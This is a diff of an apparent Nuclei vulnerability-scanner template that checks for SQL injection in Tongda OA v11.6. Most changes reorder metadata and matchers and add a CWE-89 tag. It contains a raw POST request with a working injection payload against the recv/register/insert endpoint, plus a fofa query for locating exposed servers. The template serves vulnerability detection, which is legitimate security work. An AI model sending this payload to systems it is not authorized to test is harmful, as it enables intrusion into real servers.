@@ -1,5 +1,4 @@
 id: tongda-insert-sqli
-
 info:
   name: Tongda OA v11.6 Insert Parameter - SQL Injection
   author: SleepingBag945
@@ -9,18 +8,32 @@ info:
   reference:
     - https://github.com/PeiQi0/PeiQi-WIKI-Book/blob/main/docs/wiki/oa/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v11.6%20insert%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
   classification:
+    cwe-id:
+      - CWE-89
     cpe: cpe:2.3:a:tongda2000:office_anywhere:*:*:*:*:*:*:*:*
   metadata:
     runzero-review: REJECT/2025-11-07/excluding tag intrusive
-    verified: true
-    max-request: 2
-    vendor: tongda2000
-    product: office_anywhere
     fofa-query: app="TDXK-通达OA"
-  tags: tongda,sqli,intrusive,vuln
-
+    max-request: 2
+    product: office_anywhere
+    vendor: tongda2000
+    verified: true
+  tags: intrusive,sqli,tongda,vuln
 http:
-  - raw:
+  - matchers:
+      - condition: and
+        part: header_1
+        type: word
+        words:
+          - PHPSESSID=
+          - register_for/?rid=
+      - negative: true
+        part: header_2
+        type: word
+        words:
+          - register_for/?rid=
+    matchers-condition: and
+    raw:
       - |
         POST /general/document/index.php/recv/register/insert HTTP/1.1
         Host: {{Hostname}}
@@ -33,19 +46,3 @@ http:
         Content-Type: application/x-www-form-urlencoded
 
         title)values("'"^exp(if(ascii(substr(MOD(5,2),1,1))>128,1,710)))# =1&_SERVER=
-
-    matchers-condition: and
-    matchers:
-      - type: word
-        part: header_1
-        words:
-          - "PHPSESSID="
-          - "register_for/?rid="
-        condition: and
-
-      - type: word
-        part: header_2
-        words:
-          - "register_for/?rid="
-        negative: true
-
